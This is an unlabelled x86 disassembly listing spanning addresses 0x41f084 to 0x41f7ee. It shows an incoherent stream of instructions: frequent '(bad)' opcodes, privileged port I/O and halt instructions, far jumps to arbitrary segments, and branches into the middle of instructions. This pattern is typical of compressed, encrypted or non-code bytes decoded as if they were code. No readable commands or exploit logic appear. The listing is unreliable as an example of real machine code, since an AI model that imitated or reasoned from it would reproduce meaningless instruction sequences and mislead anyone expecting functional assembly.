  41f084:	scas   al,BYTE PTR es:[edi]
  41f085:	cmp    si,dx
  41f088:	pop    ecx
  41f089:	jl     0x41f06e
  41f08b:	mov    bh,0x9e
  41f08d:	and    eax,0xdd4412b5
  41f092:	inc    eax
  41f093:	pop    eax
  41f094:	sub    al,0x8
  41f096:	ins    DWORD PTR es:[edi],dx
  41f097:	sbb    eax,0xfafd8ac8
  41f09c:	std    
  41f09d:	and    ah,BYTE PTR [ebx]
  41f09f:	scas   eax,DWORD PTR es:[edi]
  41f0a0:	xchg   ebx,eax
  41f0a1:	and    bh,BYTE PTR [ecx+0x57]
  41f0a4:	fld    TBYTE PTR [eax]
  41f0a6:	daa    
  41f0a7:	push   ds
  41f0a8:	or     al,0xa8
  41f0aa:	jl     0x41f08e
  41f0ac:	lods   eax,DWORD PTR ds:[esi]
  41f0ad:	aas    
  41f0ae:	xchg   edx,eax
  41f0af:	xchg   ecx,eax
  41f0b0:	ret    0x346d
  41f0b3:	leave  
  41f0b4:	test   ecx,edi
  41f0b6:	push   es
  41f0b7:	xchg   edi,eax
  41f0b8:	dec    ecx
  41f0b9:	cld    
  41f0ba:	or     BYTE PTR [ebx-0x1897ad12],al
  41f0c0:	inc    edi
  41f0c1:	sbb    eax,0xdcf96212
  41f0c6:	jb     0x41f127
  41f0c8:	loopne 0x41f0b8
  41f0ca:	cdq    
  41f0cb:	sar    BYTE PTR [ebx],1
  41f0cd:	jne    0x41f0b5
  41f0cf:	lahf   
  41f0d0:	push   cs
  41f0d1:	pop    eax
  41f0d2:	mov    al,0x26
  41f0d4:	pop    ss
  41f0d5:	lock mov esi,0xf4c88429
  41f0db:	sub    ecx,edx
  41f0dd:	or     bl,dh
  41f0df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0e0:	(bad)  
  41f0e2:	xchg   ebx,eax
  41f0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0e4:	and    al,0xc4
  41f0e6:	push   esp
  41f0e7:	dec    ecx
  41f0e8:	mov    dl,0xb3
  41f0ea:	xor    ch,BYTE PTR [ebx+0x43f4af2c]
  41f0f0:	test   DWORD PTR [eax+0x3f7e5185],esp
  41f0f6:	pop    esi
  41f0f7:	cmp    eax,0x9dc1d51f
  41f0fc:	popf   
  41f0fd:	xchg   ecx,eax
  41f0fe:	dec    ecx
  41f0ff:	mov    ds:0xa7d0c9d5,al
  41f104:	or     eax,DWORD PTR [ebp+0x70]
  41f107:	ret    0x70a
  41f10a:	cwde   
  41f10b:	sbb    ah,BYTE PTR [edx]
  41f10d:	jno    0x41f158
  41f10f:	xchg   ebx,eax
  41f110:	mov    ds:0x6affe681,al
  41f115:	mov    cl,0xac
  41f117:	adc    eax,0x485e4a0d
  41f11c:	or     eax,0x89a172ca
  41f121:	xlat   BYTE PTR ds:[ebx]
  41f122:	(bad)  
  41f123:	mov    ecx,0x1e2fb504
  41f128:	stos   DWORD PTR es:[edi],eax
  41f129:	push   ebp
  41f12a:	daa    
  41f12b:	and    DWORD PTR es:[eax+0x5e1f8f32],edi
  41f132:	test   DWORD PTR [ebp-0x6ef5f1a7],edx
  41f138:	sahf   
  41f139:	pop    ds
  41f13a:	xchg   BYTE PTR [eax],al
  41f13c:	push   es
  41f13d:	push   ds
  41f13e:	aad    0xea
  41f140:	loop   0x41f173
  41f142:	mov    ds:0xa20bc053,al
  41f147:	data16 cli 
  41f149:	iret   
  41f14a:	push   ss
  41f14b:	sbb    al,dl
  41f14d:	clc    
  41f14e:	xor    DWORD PTR [edx],esp
  41f150:	cmp    BYTE PTR [esi+0x7b8f9a2e],dl
  41f156:	cmp    al,0xb
  41f158:	les    edi,FWORD PTR [esi-0x148f103]
  41f15e:	add    eax,eax
  41f160:	(bad)  
  41f162:	ror    DWORD PTR [eax+0x41630d5f],cl
  41f168:	jecxz  0x41f131
  41f16a:	pop    es
  41f16b:	mov    DWORD PTR [eax-0x69],ebp
  41f16e:	imul   eax,esp,0xffffffd5
  41f171:	jmp    0x41f1a8
  41f173:	xchg   esi,eax
  41f174:	and    al,0x39
  41f176:	ficom  DWORD PTR [ebx+0x0]
  41f179:	in     al,dx
  41f17a:	pop    ds
  41f17b:	or     eax,0x696e8e6b
  41f180:	xchg   edx,eax
  41f181:	in     eax,dx
  41f182:	scas   al,BYTE PTR es:[edi]
  41f183:	xor    al,BYTE PTR [ebx-0x3b]
  41f186:	push   ss
  41f187:	add    bl,bl
  41f189:	mov    bl,0xd8
  41f18b:	sbb    al,0xe4
  41f18d:	cs adc al,0xb4
  41f190:	pop    ss
  41f191:	popf   
  41f192:	dec    eax
  41f193:	(bad)  
  41f194:	jle    0x41f1dd
  41f196:	push   ebp
  41f197:	lds    esp,FWORD PTR [ebp+0x2f]
  41f19a:	out    dx,al
  41f19b:	xchg   DWORD PTR [ecx],edx
  41f19d:	inc    ebp
  41f19e:	xor    BYTE PTR [edx-0x44],cl
  41f1a1:	inc    ecx
  41f1a2:	xor    al,BYTE PTR [ecx]
  41f1a4:	pop    edi
  41f1a5:	mov    al,0xc0
  41f1a7:	sti    
  41f1a8:	lods   al,BYTE PTR ds:[esi]
  41f1a9:	add    DWORD PTR [eax+ebp*2-0x37],0xffffffd8
  41f1ae:	cmp    ah,BYTE PTR [ebp+0x2a]
  41f1b1:	outs   dx,BYTE PTR ds:[esi]
  41f1b2:	jmp    0xd997:0x2535587e
  41f1b9:	hlt    
  41f1ba:	jne    0x38f5d645
  41f1c0:	out    0x6c,al
  41f1c2:	jg     0x41f1aa
  41f1c4:	test   al,0xf2
  41f1c6:	mov    bh,0x1c
  41f1c8:	jmp    DWORD PTR [eax-0x3e]
  41f1cb:	in     eax,0x65
  41f1cd:	cwde   
  41f1ce:	push   0x3c3d0040
  41f1d3:	adc    al,0x82
  41f1d5:	push   eax
  41f1d6:	js     0x41f167
  41f1d8:	cdq    
  41f1d9:	xor    BYTE PTR [edx+0x49],0x34
  41f1dd:	inc    esp
  41f1de:	xor    ebp,DWORD PTR [edi-0x18]
  41f1e1:	pop    eax
  41f1e2:	das    
  41f1e3:	mov    ds:0x192cdb22,eax
  41f1e8:	(bad)  
  41f1e9:	cdq    
  41f1ea:	dec    esp
  41f1eb:	in     eax,0xf2
  41f1ed:	jp     0x41f26d
  41f1ef:	retf   0x66ee
  41f1f2:	xchg   ecx,eax
  41f1f3:	ss (bad) 
  41f1f5:	fld    TBYTE PTR [edx]
  41f1f7:	or     ebx,DWORD PTR [esi+0x43905b38]
  41f1fd:	jle    0x41f1e4
  41f1ff:	mov    ebx,0x37e98262
  41f204:	imul   ebp,DWORD PTR [edx],0xffffffd4
  41f207:	pop    esi
  41f208:	xchg   al,cl
  41f20a:	pop    edx
  41f20b:	xor    al,0xe
  41f20d:	cmp    DWORD PTR ss:[eax+ebx*4],ebp
  41f211:	xchg   esp,eax
  41f212:	jnp    0x41f213
  41f214:	lea    ebx,[edx-0x9]
  41f217:	lea    edi,[ecx+0x7d33cb5e]
  41f21d:	mov    edi,es
  41f21f:	in     al,0xba
  41f221:	mov    BYTE PTR [ebp-0x24b277a4],al
  41f227:	mov    ebx,0x1b0d1ebb
  41f22c:	sbb    DWORD PTR [edi],ebx
  41f22e:	frstor [edx]
  41f230:	pop    edx
  41f231:	sti    
  41f232:	mov    al,0xe8
  41f234:	xchg   esi,eax
  41f235:	pop    es
  41f236:	stc    
  41f237:	or     al,0xbc
  41f239:	(bad)
  41f23c:	aaa    
  41f23d:	repz out 0x9,al
  41f240:	and    cl,BYTE PTR [edi-0x58]
  41f243:	jbe    0x41f256
  41f245:	std    
  41f246:	unpcklps xmm4,xmm0
  41f249:	and    ecx,esp
  41f24b:	cwde   
  41f24c:	retf   0xf496
  41f24f:	xchg   esi,eax
  41f250:	sub    eax,0xd379dd00
  41f255:	and    eax,0xebd1a71a
  41f25a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f25b:	mov    ds:0x8689ad08,al
  41f260:	daa    
  41f261:	jle    0x41f21f
  41f263:	pop    ebp
  41f264:	sub    edx,DWORD PTR [esi]
  41f266:	test   dh,dl
  41f268:	push   ebp
  41f269:	jecxz  0x41f1ed
  41f26b:	sub    ebx,esi
  41f26d:	sub    ah,dh
  41f26f:	add    BYTE PTR [ecx-0x5c],bh
  41f272:	xor    edi,DWORD PTR [ebx+0x3d]
  41f275:	ss pusha 
  41f277:	cld    
  41f278:	xor    BYTE PTR [edi],cl
  41f27a:	gs cmp eax,0xaa917e07
  41f280:	xchg   ebx,eax
  41f281:	int3   
  41f282:	aad    0xe8
  41f284:	push   ebp
  41f285:	mov    dh,0x54
  41f287:	sub    BYTE PTR [edi+0x7be29eaf],al
  41f28d:	cdq    
  41f28e:	(bad)  
  41f28f:	js     0x41f2b9
  41f291:	inc    eax
  41f292:	pop    edx
  41f293:	repz and edi,DWORD PTR [eax-0x78]
  41f297:	add    esi,DWORD PTR [ecx]
  41f299:	shl    ch,cl
  41f29b:	jnp    0x41f22b
  41f29d:	out    0x8,eax
  41f29f:	repz inc edx
  41f2a1:	hlt    
  41f2a2:	fdivr  QWORD PTR [eax+0x800820c]
  41f2a8:	sub    esi,DWORD PTR [ecx]
  41f2aa:	jmp    0x1c610a2a
  41f2af:	adc    dl,ah
  41f2b1:	mov    bh,0x15
  41f2b3:	ins    BYTE PTR es:[edi],dx
  41f2b4:	ret    0x2f13
  41f2b7:	mov    ecx,0x895ac5e
  41f2bc:	jl     0x41f2a1
  41f2be:	aam    0x8d
  41f2c0:	or     dh,BYTE PTR [edx-0x224f3e6]
  41f2c6:	fwait
  41f2c7:	xchg   esi,eax
  41f2c8:	lock jl 0x41f29d
  41f2cb:	into   
  41f2cc:	and    ecx,DWORD PTR [ecx]
  41f2ce:	sti    
  41f2cf:	pop    ds
  41f2d0:	or     BYTE PTR [ebx-0x327b7db6],bl
  41f2d6:	jmp    0x2a9e:0xcd91d721
  41f2dd:	fs call 0x72983de4
  41f2e3:	retf   
  41f2e4:	push   ax
  41f2e6:	adc    al,BYTE PTR [ecx]
  41f2e8:	lods   eax,DWORD PTR ds:[esi]
  41f2e9:	add    eax,0x8e9ae2e7
  41f2ee:	xchg   ebp,eax
  41f2ef:	mov    bh,0x88
  41f2f1:	add    esp,edi
  41f2f3:	xor    BYTE PTR es:[esi-0x40f1f6f5],0xa7
  41f2fb:	and    ebx,edx
  41f2fd:	mov    eax,ds:0x3d6c428c
  41f302:	mov    eax,0x98784346
  41f307:	in     eax,0xd9
  41f309:	pop    ebp
  41f30a:	mov    ah,0xb5
  41f30c:	mov    ds:0xbee3061b,al
  41f311:	test   DWORD PTR [esi+0x9527901],eax
  41f317:	adc    ebp,DWORD PTR [ebp-0x5d293998]
  41f31d:	sub    al,0x75
  41f31f:	sahf   
  41f320:	retf   0xbe82
  41f323:	fist   WORD PTR [ecx]
  41f325:	add    al,0x2c
  41f327:	lock call 0x7f84:0x406b34c2
  41f32f:	jns    0x41f395
  41f331:	mov    ds,WORD PTR [ebp-0x6c0d31d7]
  41f337:	inc    edi
  41f338:	(bad)  
  41f339:	repnz xor ah,cl
  41f33c:	fnstcw WORD PTR [edx]
  41f33e:	leave  
  41f33f:	repz mov bl,0x3a
  41f342:	lahf   
  41f343:	jge    0x41f325
  41f345:	mov    bh,0xc3
  41f347:	add    DWORD PTR [ebx],0x9a3a5bdd
  41f34d:	pop    esi
  41f34e:	cmp    dl,dl
  41f350:	pop    ebx
  41f351:	jns    0x41f332
  41f353:	jmp    0xe60aa86e
  41f358:	mov    edx,0x80dfd150
  41f35d:	xor    al,0x2c
  41f35f:	xchg   edi,eax
  41f360:	and    al,0x5a
  41f362:	push   esp
  41f363:	sub    eax,0xc6aec6ba
  41f368:	cmp    al,0xc5
  41f36a:	dec    ebx
  41f36b:	cwde   
  41f36c:	adc    cl,BYTE PTR [ebx]
  41f36e:	pop    eax
  41f36f:	test   eax,0x1451f35a
  41f374:	mov    bl,0xa0
  41f376:	xor    eax,0x2917da86
  41f37b:	add    al,BYTE PTR [ecx+0x16]
  41f37e:	sbb    eax,0x71582570
  41f383:	push   ds
  41f384:	ins    DWORD PTR es:[edi],dx
  41f385:	jge    0x41f3c6
  41f387:	cmp    al,0x66
  41f389:	cmc    
  41f38a:	or     BYTE PTR ds:0x8c3b2ab4,ah
  41f390:	(bad)  
  41f391:	clc    
  41f392:	loope  0x41f405
  41f394:	xlat   BYTE PTR ds:[ebx]
  41f395:	dec    ebp
  41f396:	jo     0x41f341
  41f398:	sub    DWORD PTR [ebx],edi
  41f39a:	sbb    ah,bl
  41f39c:	inc    ebx
  41f39d:	repz or edx,ebx
  41f3a0:	xor    al,0x4
  41f3a2:	sbb    ebp,DWORD PTR [esi-0x41]
  41f3a5:	mov    eax,ds:0xf33c16a2
  41f3aa:	data16 ins BYTE PTR es:[edi],dx
  41f3ac:	inc    edi
  41f3ad:	push   0x59
  41f3af:	pusha  
  41f3b0:	pop    esi
  41f3b1:	jbe    0x41f3f0
  41f3b3:	fadd   DWORD PTR [edi+0x5c]
  41f3b6:	mov    esi,eax
  41f3b8:	das    
  41f3b9:	lods   eax,DWORD PTR ds:[esi]
  41f3ba:	sub    bl,bh
  41f3bc:	imul   ebp,esp,0xffffffd1
  41f3bf:	jnp    0x41f3be
  41f3c1:	fmul   QWORD PTR [esi-0x1]
  41f3c4:	test   ebp,edx
  41f3c6:	test   BYTE PTR [edx+eax*4],al
  41f3c9:	or     eax,0x73f4e8ed
  41f3ce:	loopne 0x41f41d
  41f3d0:	xchg   esi,eax
  41f3d1:	out    0x10,eax
  41f3d3:	jno    0x41f3e1
  41f3d5:	popf   
  41f3d6:	lahf   
  41f3d7:	push   esp
  41f3d8:	jns    0x41f38c
  41f3da:	outs   dx,DWORD PTR ds:[esi]
  41f3db:	fldcw  WORD PTR [ecx+0x3e]
  41f3de:	and    ecx,DWORD PTR [esi+ebp*4+0x538d00]
  41f3e5:	mov    eax,es:0x149c7ad1
  41f3eb:	clc    
  41f3ec:	outs   dx,DWORD PTR ds:[esi]
  41f3ed:	sbb    eax,0x2398dab5
  41f3f2:	pop    ebp
  41f3f3:	cmc    
  41f3f4:	(bad)  
  41f3f5:	jo     0x41f3fc
  41f3f7:	data16 sahf 
  41f3f9:	sub    BYTE PTR [esi+0x6d],bl
  41f3fc:	lock rcl BYTE PTR es:[eax+edx*2+0x30],1
  41f402:	fwait
  41f403:	rcr    BYTE PTR [edi],0x80
  41f406:	scas   al,BYTE PTR es:[edi]
  41f407:	sub    eax,0xc3c2d7c7
  41f40c:	dec    ebp
  41f40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f40e:	xchg   edi,eax
  41f40f:	data16 sbb al,0x8f
  41f412:	adc    DWORD PTR [edi],edx
  41f414:	or     edx,DWORD PTR [ebp-0x62]
  41f417:	sub    ecx,edi
  41f419:	pop    eax
  41f41a:	mov    ecx,0x28e21304
  41f41f:	shl    DWORD PTR [esi-0x50cf5e26],cl
  41f425:	ret    0x1dc
  41f428:	dec    esi
  41f429:	cmp    cl,BYTE PTR [eax-0x11113858]
  41f42f:	cmp    DWORD PTR [ecx-0x574dcd04],esp
  41f435:	sar    DWORD PTR [edi+ebx*1-0x2f],1
  41f439:	bswap  eax
  41f43b:	or     al,0x35
  41f43d:	clc    
  41f43e:	call   0x1cea78e3
  41f443:	sub    ch,BYTE PTR [eax]
  41f445:	idiv   BYTE PTR [edi+0x4c]
  41f448:	js     0x41f3cb
  41f44a:	out    dx,al
  41f44b:	cmp    dl,BYTE PTR [esi-0x2c307445]
  41f451:	xor    DWORD PTR [edi+0x1afeb497],0xf0b38aec
  41f45b:	mov    esi,ebx
  41f45d:	js     0x41f4b1
  41f45f:	inc    ebp
  41f460:	addr16 sbb al,0x8
  41f463:	imul   esi,esi,0xffffffcd
  41f466:	jp     0x41f4bf
  41f468:	mov    dh,0xb2
  41f46a:	xchg   BYTE PTR [ebp+0x7ff59e6d],cl
  41f470:	and    cl,BYTE PTR [ecx]
  41f472:	xlat   BYTE PTR ds:[ebx]
  41f473:	jne    0x41f448
  41f475:	inc    ebx
  41f476:	cli    
  41f477:	out    dx,al
  41f478:	call   0xbb5bcb51
  41f47d:	les    edx,FWORD PTR [ebp+0x405f2779]
  41f483:	mov    ds:0xcac75cef,eax
  41f488:	ins    DWORD PTR es:[edi],dx
  41f489:	cwde   
  41f48a:	cmc    
  41f48b:	add    esp,DWORD PTR [esi-0xa]
  41f48e:	inc    ebp
  41f48f:	push   ds
  41f490:	sbb    al,0xd
  41f492:	popa   
  41f493:	(bad)  
  41f494:	and    ebx,DWORD PTR [edx-0x30]
  41f497:	ins    BYTE PTR es:[edi],dx
  41f498:	pushf  
  41f499:	xor    al,0xeb
  41f49b:	call   0xd87badf3
  41f4a0:	add    BYTE PTR [ecx-0x46a04ae0],cl
  41f4a6:	push   esi
  41f4a7:	adc    BYTE PTR [ebx],bh
  41f4a9:	mov    esp,0x173affbe
  41f4ae:	popa   
  41f4af:	dec    esi
  41f4b0:	sub    bl,0x2
  41f4b3:	xchg   ebp,eax
  41f4b4:	retf   
  41f4b5:	jmp    0x41f492
  41f4b7:	out    0x1d,al
  41f4b9:	stc    
  41f4ba:	aaa    
  41f4bb:	jae    0x41f4fe
  41f4bd:	int3   
  41f4be:	cdq    
  41f4bf:	fs pop es
  41f4c1:	outs   dx,BYTE PTR ds:[esi]
  41f4c2:	sbb    ebp,DWORD PTR ds:0x8706a3fb
  41f4c8:	dec    esp
  41f4c9:	out    0x46,eax
  41f4cb:	shl    BYTE PTR [ebp-0x5898d0aa],0x4
  41f4d2:	or     DWORD PTR [eax+0x6e],0x6e1b9ac9
  41f4d9:	cmp    eax,DWORD PTR [ecx]
  41f4db:	addr16 in al,0xbb
  41f4de:	mov    edi,0x73a39f99
  41f4e3:	js     0x41f488
  41f4e5:	ins    DWORD PTR es:[edi],dx
  41f4e6:	icebp  
  41f4e7:	popf   
  41f4e8:	(bad)  [edi+0x1f]
  41f4eb:	mov    DWORD PTR [edi+0x2708a8e],0x6474df70
  41f4f5:	outs   dx,DWORD PTR ds:[esi]
  41f4f6:	ja     0x41f4fb
  41f4f8:	sbb    eax,0x6c68c292
  41f4fd:	mov    WORD PTR [eax],cs
  41f4ff:	push   ebx
  41f500:	or     bl,bh
  41f502:	fdivr  DWORD PTR [ecx]
  41f504:	inc    eax
  41f505:	jmp    0x762ab118
  41f50a:	add    DWORD PTR [eax-0x80],ebp
  41f50d:	jle    0x41f552
  41f50f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f510:	xchg   BYTE PTR [eax],ch
  41f512:	addr16 js 0x41f4ad
  41f515:	loop   0x41f4a3
  41f517:	jno    0x41f4a3
  41f519:	das    
  41f51a:	xchg   esi,eax
  41f51b:	pop    es
  41f51c:	xchg   edx,eax
  41f51d:	sar    BYTE PTR [edx+0x6d],0xef
  41f521:	or     al,0x26
  41f523:	lds    ecx,FWORD PTR [ecx+0x365c0f5e]
  41f529:	mov    ebx,0x4cdb7348
  41f52e:	xchg   ecx,eax
  41f52f:	daa    
  41f530:	add    BYTE PTR es:0xb4f9d686,bh
  41f537:	out    0x39,eax
  41f539:	add    esp,ebp
  41f53b:	dec    ebx
  41f53c:	aam    0xa8
  41f53e:	scas   eax,DWORD PTR es:[edi]
  41f53f:	aas    
  41f540:	aas    
  41f541:	sub    al,0x43
  41f543:	pop    ds
  41f544:	xor    DWORD PTR [edx+0x16e34bb7],0x7318736b
  41f54e:	cmp    BYTE PTR ds:0x59279bcc,al
  41f554:	in     al,dx
  41f555:	pop    ds
  41f556:	mov    ax,0x54e0
  41f55a:	ins    BYTE PTR es:[edi],dx
  41f55b:	sahf   
  41f55c:	jmp    0x7fa0:0x31b6b5e0
  41f563:	fimul  WORD PTR [edx]
  41f565:	mov    dh,0x1c
  41f567:	lods   al,BYTE PTR ds:[esi]
  41f568:	mov    ch,0x79
  41f56a:	xor    al,0x78
  41f56c:	pusha  
  41f56d:	and    DWORD PTR ds:0x89c48c86,edi
  41f573:	repz cdq 
  41f575:	add    al,0x15
  41f577:	jl     0x41f529
  41f579:	aam    0x7a
  41f57b:	xchg   ebp,eax
  41f57c:	out    0x96,al
  41f57e:	or     BYTE PTR [eax+0x180beb64],0x61
  41f585:	out    0xa7,eax
  41f587:	scas   al,BYTE PTR es:[edi]
  41f588:	fistp  DWORD PTR [ebx+0x47]
  41f58b:	int    0xb7
  41f58d:	or     DWORD PTR [eax+0x30],eax
  41f590:	jno    0x41f5e2
  41f592:	clc    
  41f593:	in     eax,0x38
  41f595:	mov    eax,ds:0x99f9cb88
  41f59a:	loop   0x41f558
  41f59c:	stos   BYTE PTR es:[edi],al
  41f59d:	jmp    0xaf4454bb
  41f5a2:	mov    WORD PTR [esp+ecx*8-0x6c],cs
  41f5a6:	fnstcw WORD PTR [edx-0x73]
  41f5a9:	lds    esp,FWORD PTR [edi+0x33]
  41f5ac:	push   0x74
  41f5ae:	shl    BYTE PTR [edi],cl
  41f5b0:	jo     0x41f5cd
  41f5b2:	pop    esi
  41f5b3:	cli    
  41f5b4:	mov    edi,0xac57ed84
  41f5b9:	test   al,0xbf
  41f5bb:	push   0x2a
  41f5bd:	lods   eax,DWORD PTR ds:[esi]
  41f5be:	lods   eax,DWORD PTR ds:[esi]
  41f5bf:	in     al,0x4b
  41f5c1:	cdq    
  41f5c2:	and    eax,0x8b097f15
  41f5c7:	mov    ebp,0x72ac34c9
  41f5cc:	in     al,0x23
  41f5ce:	mov    edi,0xecc698e7
  41f5d3:	cmp    al,bl
  41f5d5:	loopne 0x41f648
  41f5d7:	(bad)  
  41f5d8:	(bad)  
  41f5d9:	mov    ebp,0x94936eb3
  41f5de:	fnsave [ebx-0x7]
  41f5e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5e2:	iretw  
  41f5e4:	add    ah,bl
  41f5e6:	sub    eax,0x3a57272d
  41f5eb:	pop    ecx
  41f5ec:	mov    cl,0x8f
  41f5ee:	mov    ah,0x7d
  41f5f0:	shr    DWORD PTR [edx+0x551a1cb5],1
  41f5f6:	arpl   bx,dx
  41f5f8:	ja     0x41f66e
  41f5fa:	mov    eax,ds:0xfc0b7219
  41f5ff:	enter  0x4ba7,0xb7
  41f603:	popf   
  41f604:	cmp    al,0xb0
  41f606:	jnp    0x41f638
  41f608:	bound  edx,QWORD PTR [edi+edi*8+0x21]
  41f60c:	mov    bl,0x36
  41f60e:	xor    eax,0x48f1eb26
  41f613:	adc    bl,BYTE PTR [ecx+0x76886ac6]
  41f619:	popf   
  41f61a:	push   0x70
  41f61c:	(bad)  [edi]
  41f61e:	push   cs
  41f61f:	inc    esp
  41f620:	arpl   WORD PTR [edx+0x20],cx
  41f623:	pop    eax
  41f624:	fsub   DWORD PTR [ecx+0x67]
  41f627:	or     ebp,DWORD PTR [ebp-0x7a]
  41f62a:	lods   eax,DWORD PTR ds:[esi]
  41f62c:	sbb    al,0x86
  41f62e:	out    dx,al
  41f62f:	jl     0x41f5ff
  41f631:	sub    al,0x20
  41f633:	mov    ds:0x579fc673,eax
  41f638:	xchg   ecx,eax
  41f639:	add    eax,0x5113ee3f
  41f63e:	dec    ebx
  41f63f:	add    eax,0x193acf8c
  41f644:	sahf   
  41f645:	cmp    di,di
  41f648:	inc    edi
  41f649:	push   esp
  41f64a:	imul   esi,esi,0xffffffc3
  41f64d:	or     edx,DWORD PTR [ebx]
  41f64f:	add    esp,ebx
  41f651:	cmc    
  41f652:	xchg   ebx,eax
  41f653:	sub    bh,BYTE PTR [edx]
  41f655:	jnp    0x41f685
  41f657:	adc    esp,DWORD PTR [eax-0x7456c6fc]
  41f65d:	add    ah,BYTE PTR ds:0x27495fa9
  41f663:	dec    edx
  41f664:	pushf  
  41f665:	scas   al,BYTE PTR es:[edi]
  41f666:	push   ds
  41f667:	cmp    ch,bh
  41f669:	push   eax
  41f66a:	(bad)  
  41f66b:	cli    
  41f66c:	and    edx,DWORD PTR [edi+0x7c]
  41f66f:	fwait
  41f670:	sub    BYTE PTR [edi+0x9],bh
  41f673:	retf   0x9afe
  41f676:	ins    BYTE PTR es:[edi],dx
  41f677:	dec    esp
  41f678:	scas   eax,DWORD PTR es:[edi]
  41f679:	(bad)  
  41f67a:	push   0x64
  41f67c:	xchg   ebp,eax
  41f67d:	xor    eax,0xef48bef0
  41f682:	loop   0x41f6d9
  41f684:	mov    al,ds:0xacfaaee1
  41f689:	call   0x65cd4876
  41f68e:	or     eax,0xcc05d546
  41f693:	out    0x72,eax
  41f695:	imul   esi,ebp,0x46
  41f698:	ja     0x41f6fa
  41f69a:	mov    eax,ds:0xed6ca5ad
  41f69f:	mov    edx,0xfb572917
  41f6a4:	sbb    eax,0xd25d57aa
  41f6a9:	jmp    0xdbd6895d
  41f6ae:	scas   eax,DWORD PTR es:[edi]
  41f6af:	and    al,al
  41f6b1:	xchg   ebp,eax
  41f6b2:	sbb    bh,BYTE PTR [eax-0x2d6fbedd]
  41f6b8:	xchg   edi,eax
  41f6b9:	es adc ah,ah
  41f6bc:	(bad)  
  41f6bd:	aas    
  41f6be:	sub    esp,ecx
  41f6c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6c1:	cli    
  41f6c2:	push   ebp
  41f6c3:	xchg   esi,eax
  41f6c4:	sbb    al,0x42
  41f6c6:	call   0xb8a1:0xfd130d04
  41f6cd:	outs   dx,DWORD PTR ds:[esi]
  41f6ce:	test   al,0x3e
  41f6d0:	popf   
  41f6d1:	call   FWORD PTR [ebx-0x63f072dc]
  41f6d7:	mov    bl,0xb8
  41f6d9:	push   edi
  41f6da:	enter  0x7e6e,0x71
  41f6de:	sbb    esi,DWORD PTR [edi+ecx*2-0x1f5dde]
  41f6e5:	jp     0x41f705
  41f6e7:	dec    edi
  41f6e8:	out    0x6,al
  41f6ea:	sbb    ebx,DWORD PTR [ebp+0x3250dfe0]
  41f6f0:	xor    esp,DWORD PTR [ebp+0x40c97627]
  41f6f6:	rcl    BYTE PTR [edx],cl
  41f6f8:	aam    0x54
  41f6fa:	jecxz  0x41f756
  41f6fc:	cmp    eax,0x698aeb38
  41f701:	cdq    
  41f702:	add    al,0x6d
  41f704:	out    dx,eax
  41f705:	mov    edi,esi
  41f707:	fidiv  DWORD PTR [esp+esi*8-0x6]
  41f70b:	pushf  
  41f70c:	inc    esp
  41f70d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f70e:	add    ecx,DWORD PTR [edx-0x3f]
  41f711:	mov    ebp,0xb553fe77
  41f716:	sbb    al,0x9b
  41f718:	data16 or BYTE PTR [eax-0x46],bl
  41f71c:	inc    eax
  41f71e:	fsub   DWORD PTR [eax]
  41f720:	push   ebx
  41f721:	inc    esp
  41f722:	cmp    DWORD PTR [ebx+0x4a6a30e9],0x61
  41f729:	loope  0x41f760
  41f72b:	repz and DWORD PTR [eax],eax
  41f72e:	xor    DWORD PTR [ecx+0x19ca7694],esi
  41f734:	lahf   
  41f735:	mov    dh,0x69
  41f737:	push   ebp
  41f738:	xchg   DWORD PTR [ecx-0x6a5d8209],ebx
  41f73e:	add    DWORD PTR [ebx],esi
  41f740:	mov    bl,0x97
  41f742:	jl     0x41f72e
  41f744:	mov    cl,0xfc
  41f746:	lahf   
  41f747:	adc    eax,0xc364c9df
  41f74c:	call   0x6b5c:0x3030ba1e
  41f753:	push   0x552ffef3
  41f758:	imul   edi,DWORD PTR [ebx-0x7e],0x83be252
  41f75f:	mov    ch,0x8c
  41f761:	adc    eax,0x67b86ded
  41f766:	cmp    al,0xca
  41f768:	gs clc 
  41f76a:	sbb    al,0x1c
  41f76c:	inc    esi
  41f76d:	out    0x79,al
  41f76f:	mov    cl,0xb2
  41f771:	fldenv [edi+0x6090c41b]
  41f777:	add    DWORD PTR [edx],ecx
  41f779:	xchg   esp,eax
  41f77a:	mov    bh,0xfe
  41f77c:	mov    bl,bh
  41f77e:	mov    ebp,0x823f8635
  41f783:	fdivrp st(4),st
  41f785:	add    eax,0x216ca685
  41f78a:	inc    ecx
  41f78b:	add    al,0xe0
  41f78d:	scas   eax,DWORD PTR es:[edi]
  41f78e:	mov    dl,0x99
  41f790:	addr16 pop ss
  41f792:	sbb    al,0xb
  41f794:	dec    esi
  41f795:	pop    ds
  41f796:	jmp    0xddc2:0x83f74638
  41f79d:	jbe    0x41f7db
  41f79f:	adc    BYTE PTR [edi-0x1dec09f6],ah
  41f7a5:	mov    ebp,0xa89f2763
  41f7aa:	pop    ds
  41f7ab:	daa    
  41f7ac:	or     al,0xe7
  41f7ae:	out    dx,eax
  41f7af:	loope  0x41f7c3
  41f7b1:	push   ecx
  41f7b2:	addr16 adc eax,0x3ee9c06f
  41f7b8:	loope  0x41f816
  41f7ba:	js     0x41f817
  41f7bc:	mov    ch,ch
  41f7be:	fiadd  DWORD PTR [ebx-0x5455f29a]
  41f7c4:	inc    eax
  41f7c5:	(bad)  
  41f7c6:	xor    BYTE PTR [edx+0x41629f01],ch
  41f7cc:	lods   eax,DWORD PTR ds:[esi]
  41f7cd:	mov    ecx,gs
  41f7cf:	cmp    BYTE PTR [esi-0x3],bl
  41f7d2:	jg     0x41f808
  41f7d4:	or     eax,ebx
  41f7d6:	enter  0xbca5,0x8a
  41f7da:	ds jl  0x41f77f
  41f7dd:	(bad)  
  41f7de:	push   esi
  41f7df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7e0:	(bad)  
  41f7e1:	repnz pop esp
  41f7e3:	mov    DWORD PTR [ecx-0x74],esp
  41f7e6:	out    0xa9,al
  41f7e8:	adc    edx,esi
  41f7ea:	loop   0x41f852
  41f7ec:	sub    esi,DWORD PTR [edx]
  41f7ee:	repnz imul eax,ecx,0x12
